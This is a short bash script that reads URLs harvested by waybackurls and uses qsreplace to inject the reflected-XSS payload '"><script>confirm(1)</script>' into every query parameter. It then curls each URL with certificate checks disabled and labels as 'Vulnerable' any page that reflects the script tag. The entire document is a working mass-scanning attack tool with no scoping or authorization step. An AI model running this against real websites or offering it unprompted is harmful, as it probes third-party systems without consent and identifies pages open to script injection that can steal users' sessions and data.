
set -x
### input is from waybackurls
grep "=" |egrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|woff|woff2|ico|pdf|svg|txt|js)" | qsreplace '"><script>confirm(1)</script>' > combinedfuzz.json
cat combinedfuzz.json | while 
read host 
do
	###verbose version
	###curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo -e "$host \033[0;31mVulnerable\n" || echo -e "$host \033[0;32mNot Vulnerable\n"
	### silent version
	curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo -e "$host \033[0;31mVulnerable\n"
	####curl --silent --path-as-is --insecure "$host" | grep -qs "<script>confirm(1)" && echo -e "$host \033[0;31mVulnerable\n"
done
